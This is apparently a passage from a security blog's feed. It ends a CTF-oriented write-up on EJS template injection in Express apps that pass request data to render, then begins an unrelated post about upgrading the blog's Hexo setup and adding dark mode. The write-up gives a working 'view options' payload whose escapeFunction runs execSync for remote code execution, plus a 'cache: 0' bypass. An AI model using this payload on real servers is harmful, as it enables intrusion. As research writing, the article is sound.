keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> cb<span class="token punctuation">;</span>  <span class="token keyword">var</span> opts <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">filename</span><span class="token operator">:</span> filename<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> data<span class="token punctuation">;</span>  <span class="token keyword">var</span> viewOpts<span class="token punctuation">;</span>  <span class="token comment">// Do we have a callback?</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> arguments<span class="token punctuation">[</span>arguments<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    cb <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// Do we have data/opts?</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Should always have data obj</span>    data <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Normal passed opts (data obj + opts obj)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Use shallowCopy so we don't pollute passed in opts obj with new vals</span>      utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Special casing for Express (settings + opts-in-data)</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Express 3 and 4</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Pull a few things from known locations</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          opts<span class="token punctuation">.</span>views <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view cache'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          opts<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Undocumented after Express 2, but still usable, esp. for</span>        <span class="token comment">// items that are unsafe to be passed along with data, like `root`</span>        viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Express 2 and lower, values set in app.locals, or people who just</span>      <span class="token comment">// want to pass options in their data. NOTE: These values will override</span>      <span class="token comment">// anything previously set in settings  or settings['view options']</span>      utils<span class="token punctuation">.</span><span class="token function">shallowCopyFromList</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> _OPTS_PASSABLE_WITH_DATA_EXPRESS<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    opts<span class="token punctuation">.</span>filename <span class="token operator">=</span> filename<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    data <span class="token operator">=</span> utils<span class="token punctuation">.</span><span class="token function">createNullProtoObjWherePossible</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">tryHandleCache</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> cb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The key point here is the middle part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Pull a few things from known locations</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    opts<span class="token punctuation">.</span>views <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">.</span>views<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view cache'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    opts<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// Undocumented after Express 2, but still usable, esp. for</span>  <span class="token comment">// items that are unsafe to be passed along with data, like `root`</span>  viewOpts <span class="token operator">=</span> data<span class="token punctuation">.</span>settings<span class="token punctuation">[</span><span class="token string">'view options'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>viewOpts<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    utils<span class="token punctuation">.</span><span class="token function">shallowCopy</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> viewOpts<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>In short, setting <code>data.settings[&#39;view options&#39;]</code> can override <code>opts</code>.</p><p>Next, follow down to <code>handleCache</code>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">handleCache</span><span class="token punctuation">(</span><span class="token parameter">options<span class="token punctuation">,</span> template</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> func<span class="token punctuation">;</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> options<span class="token punctuation">.</span>filename<span class="token punctuation">;</span>  <span class="token keyword">var</span> hasTemplate <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'cache option requires a filename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    func <span class="token operator">=</span> exports<span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> func<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasTemplate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      template <span class="token operator">=</span> <span class="token function">fileLoader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>_BOM<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasTemplate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// istanbul ignore if: should not happen at all</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Internal EJS error: no file name or template '</span>                    <span class="token operator">+</span> <span class="token string">'provided'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    template <span class="token operator">=</span> <span class="token function">fileLoader</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>_BOM<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  func <span class="token operator">=</span> exports<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>template<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>cache<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    exports<span class="token punctuation">.</span>cache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> func<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>If <code>options.cache</code> is set, use the already compiled content in the cache, otherwise compile it again.</p><p>The most important part is <a href="https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L571">compile</a>, which has the following code:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  src <span class="token operator">=</span> <span class="token string">'escapeFn = escapeFn || '</span> <span class="token operator">+</span> escapeFn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    src <span class="token operator">=</span> <span class="token string">'rethrow = rethrow || '</span> <span class="token operator">+</span> rethrow<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It will use <code>escapeFn</code> to concatenate the code.</p><p>So we just need to pass in:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">settings</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">'view options'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">client</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      <span class="token literal-property property">escapeFunction</span><span class="token operator">:</span> <span class="token string">'(() => &#123;&#125;);return process.mainModule.require("child_process").execSync("id").toString()'</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>to execute any code and achieve RCE.</p><h2><span id="cache-issue">Cache Issue</span></h2><p>Although the previous explanation was smooth, there is a cache issue.</p><p>Under production mode, view cache will be <a href="https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L126">automatically enabled</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>env <span class="token operator">===</span> <span class="token string">'production'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enable</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>And this parameter will be automatically passed to options when rendering:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// set .cache unless explicitly provided</span><span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Although we can override the original options through view options, if the original options already contain cache, it will be overridden again:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">utils<span class="token punctuation">.</span><span class="token function">shallowCopyFromList</span><span class="token punctuation">(</span>opts<span class="token punctuation">,</span> data<span class="token punctuation">,</span> _OPTS_PASSABLE_WITH_DATA_EXPRESS<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>If we cannot override cache, then we cannot use the above method because the template will not be recompiled.</p><p>However, it doesn’t matter, fortunately this is JavaScript, pay attention to this line of code:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>renderOptions<span class="token punctuation">.</span>cache <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  renderOptions<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">enabled</span><span class="token punctuation">(</span><span class="token string">'view cache'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>If <code>renderOptions.cache</code> is null, it will be set, and <code>0 == null</code> is false, so we can pass in <code>cache: 0</code> to bypass the check and make <code>if (options.cache)</code> false.</p><h2><span id="ejs-authors-view">EJS Author’s View</span></h2><p>In fact, EJS has had many related issues since the past, the list is as follows:</p><ul><li><a href="https://github.com/mde/ejs/issues/451">Unrestricted render option may lead to a RCE vulnerability #451</a></li><li><a href="https://github.com/mde/ejs/pull/601">Mitigate prototype pollution effects #601</a></li><li><a href="https://github.com/mde/ejs/issues/663">[Vulnerability] Server side template injection leads to RCE #663</a></li><li><a href="https://github.com/mde/ejs/issues/720">EJS, Server side template injection ejs@3.1.9 Latest #720</a></li><li><a href="https://github.com/mde/ejs/issues/735">EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) #735</a></li></ul><p>The author’s stance has remained the same from the past to the present:</p><blockquote><p>The problem here is that EJS is simply a way of executing JS to render a template. If you allow passing of arbitrary&#x2F;unsanitized options and data to the render function, you will encounter all security problems that would occur as a result of arbitrary code execution. Henny Youngman used to tell a joke: “The patient says, ‘Doctor, it hurts when I do this.’ So the doctor says, ‘Then don’t do that!’” I’m open to PRs that improve security, but this looks to me to be far beyond the purview of the library. These responsibilities live squarely in userland.</p></blockquote><p>Basically, if developers want to use the library in this way, the author cannot do anything about it. This is not the responsibility of EJS and end users should not be allowed to pass in the entire object.</p><p>Recently, EJS developers have also added a notice in the README and on the official website due to receiving many similar issue reports:</p><blockquote><p>Security professionals, before reporting any security issues, please reference the SECURITY.md in this project, in particular, the following: “EJS is effectively a JavaScript runtime. Its entire job is to execute JavaScript. If you run the EJS render method without checking the inputs yourself, you are responsible for the results.”</p></blockquote><p>So this trick can be used now and in the future. If someone can control the object during rendering, it means that RCE can be achieved.</p><p>Later, I want to write another article from the developer’s perspective. Although what the EJS author said makes sense, at least as a library, EJS should remind developers in the documentation not to use it in this way. Although there is already a prompt now, it is more targeted at asking security researchers not to report, rather than asking developers not to use it in this way.</p><p>Or maybe this is actually a bad coding practice. There should not have been such a pattern in the first place that allows others to exploit it.</p><p>I haven’t figured this out yet. I’ll write about it when I do.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Originally, I intended to write this article from a developer’s perspective. However, due to time constraints, I will first write a CTF-oriented article to record this issue. I will write from a developer’s perspective when I have more time.&lt;/p&gt;
&lt;p&gt;In short, this article discusses the problems caused by using the following pattern:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-javascript&quot; data-language=&quot;javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; express &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;express&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; app &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;express&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; port &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3000&lt;/span&gt;

app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;view engine&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;ejs&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;/&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;req&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;res&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    res&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;index&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; req&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;query&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
  console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;Example app listening on port &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;$&amp;#123;&lt;/span&gt;port&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Updating Blog with chatGPT</title>
    <link href="https://blog.huli.tw/2023/06/20/en/update-blog-with-chatgpt/"/>
    <id>https://blog.huli.tw/2023/06/20/en/update-blog-with-chatgpt/</id>
    <published>2023-06-20T06:10:44.000Z</published>
    <updated>2023-06-20T06:37:57.901Z</updated>
    
    <content type="html"><![CDATA[<p>It’s been a long time since I made any major changes to my blog structure. Hexo has already released v6, and v7 is currently in beta, but my blog is still on hexo3.</p><p>Recently, I had some free time and decided to update my blog, and also use chatGPT as a helper.</p><p>The changes I made this time are:</p><ol><li>Upgraded Hexo version</li><li>Modified syntax highlight</li><li>Dark mode</li><li>Automatic translation (highlight)</li></ol><span id="more"></span><h2><span id="upgraded-hexo-version">Upgraded Hexo version</span></h2><p>The upgrade was smoother than I expected. I installed <code>npm-upgrade</code> following the tutorial I found online, and after running it, the upgrade was done. There wasn’t much to adjust after the upgrade.</p><p>It was really smooth!</p><h2><span id="modified-syntax-highlight">Modified syntax highlight</span></h2><p>I used to use highlight.js, but I wanted to switch to another one for a long time because it doesn’t support JSX.</p><p>After upgrading, I found that Hexo has built-in support for another one called Prism.js, so I switched to it. I just needed to modify the configuration file and manually add the style, which was quite simple.</p><p>The only trouble was that some classes conflicted with other libraries, so I had to adjust them manually.</p><h2><span id="dark-mode">Dark mode</span></h2><p><img src="/img/update-blog-with-chatgpt/p1.png" alt="dark mode"></p><p>I used <a href="https://bulma.io/">Bulma</a> CSS library for my theme, but it doesn’t support dark mode, so I had to create one myself.</p><p>The way I did it was quite simple. I first found the color of every word and background on the page and replaced them with CSS variables. Finally, I added some simple JavaScript to complete it.</p><p>The CSS part looks like this:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">:root</span> <span class="token punctuation">&#123;</span>  <span class="token property">--main-text-color</span><span class="token punctuation">:</span> #4a4a4a<span class="token punctuation">;</span>  <span class="token property">--main-bg-color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>  <span class="token property">--main-border-color</span><span class="token punctuation">:</span> #dbdbdb<span class="token punctuation">;</span>  <span class="token property">--title-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--link-text-color</span><span class="token punctuation">:</span> #3273dc<span class="token punctuation">;</span>  <span class="token property">--link-hover-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--code-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--code-text-color</span><span class="token punctuation">:</span> #ff3860<span class="token punctuation">;</span>  <span class="token property">--tag-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--tag-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--quote-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--nav-link-text-color</span><span class="token punctuation">:</span> darkgray<span class="token punctuation">;</span>  <span class="token property">--notice-bg-color</span><span class="token punctuation">:</span> #ffe4c4<span class="token punctuation">;</span>  <span class="token property">--archive-time-color</span><span class="token punctuation">:</span> #888<span class="token punctuation">;</span>  <span class="token property">--archive-hover-border-color</span><span class="token punctuation">:</span> black<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">body.dark-mode</span> <span class="token punctuation">&#123;</span>  <span class="token property">--main-text-color</span><span class="token punctuation">:</span> #f8f8f8<span class="token punctuation">;</span>  <span class="token property">--main-bg-color</span><span class="token punctuation">:</span> #061320<span class="token punctuation">;</span>  <span class="token property">--main-border-color</span><span class="token punctuation">:</span> #dbdbdb<span class="token punctuation">;</span>  <span class="token property">--title-text-color</span><span class="token punctuation">:</span> #fafafa<span class="token punctuation">;</span>  <span class="token property">--link-text-color</span><span class="token punctuation">:</span> #27ebda<span class="token punctuation">;</span>  <span class="token property">--link-hover-text-color</span><span class="token punctuation">:</span> #98fff6<span class="token punctuation">;</span>  <span class="token property">--code-bg-color</span><span class="token punctuation">:</span> #324b7e<span class="token punctuation">;</span>  <span class="token property">--code-text-color</span><span class="token punctuation">:</span> #f7f7f7<span class="token punctuation">;</span>  <span class="token property">--tag-bg-color</span><span class="token punctuation">:</span> whitesmoke<span class="token punctuation">;</span>  <span class="token property">--tag-text-color</span><span class="token punctuation">:</span> #363636<span class="token punctuation">;</span>  <span class="token property">--quote-bg-color</span><span class="token punctuation">:</span> #49495e<span class="token 